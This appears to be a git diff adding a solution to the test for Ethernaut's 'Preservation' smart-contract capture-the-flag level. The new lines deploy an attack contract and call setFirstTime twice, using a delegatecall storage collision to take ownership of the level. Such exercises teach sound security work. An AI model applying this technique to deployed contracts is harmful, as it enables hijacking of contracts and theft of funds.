@@ -8,6 +8,7 @@ import {Preservation} from "src/levels/Preservation.sol";
 import {PreservationFactory} from "src/levels/PreservationFactory.sol";
 import {Level} from "src/levels/base/Level.sol";
 import {Ethernaut} from "src/Ethernaut.sol";
+import {PreservationAttack} from "../../src/attacks/PreservationAttack.sol";
 
 contract TestPreservation is Test, Utils {
     Ethernaut ethernaut;
@@ -58,6 +59,8 @@ contract TestPreservation is Test, Utils {
 
     /// @notice Test the solution for the level.
     function testSolve() public checkSolvedByPlayer{
-
+        PreservationAttack attack = new PreservationAttack();
+        instance.setFirstTime(uint256(uint160(address(attack))));
+        instance.setFirstTime(uint256(uint160(address(player))));
     }
 }
